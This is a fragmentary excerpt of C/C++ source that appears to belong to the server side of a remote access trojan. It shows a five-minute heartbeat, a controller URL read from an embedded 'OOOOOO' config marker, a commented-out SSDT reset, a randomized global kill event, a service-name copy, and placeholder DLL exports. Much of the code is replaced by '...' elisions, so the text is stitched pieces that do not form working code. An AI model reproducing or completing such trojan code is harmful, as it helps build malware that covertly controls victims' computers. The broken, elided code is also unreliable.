...
#define		HEART_BEAT_TIME		1000 * 60 * 5 // 心跳时间
...
#endif
{
...
#ifdef _DLL
	char	*lpURL = (char *)FindConfigString(CKernelManager::g_hInstance, "OOOOOO");
	if (lpURL == NULL)
	{
		return -1;
	}
	...
	if (CKernelManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);
		//ResetSSDT();
		
		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\abc %d", GetTickCount()); // 随机事件名
...
extern "C" __declspec(dllexport) bool oooooo()
{
	return false;
}
extern "C" __declspec(dllexport) bool xxxxxx()
{
	return false;
}
                     ...
                     )
{
	...
	case DLL_THREAD_ATTACH:
		CKernelManager::m_dwLastMsgTime = GetTickCount();
		CKernelManager::g_hInstance = (HINSTANCE)hModule;
		break;
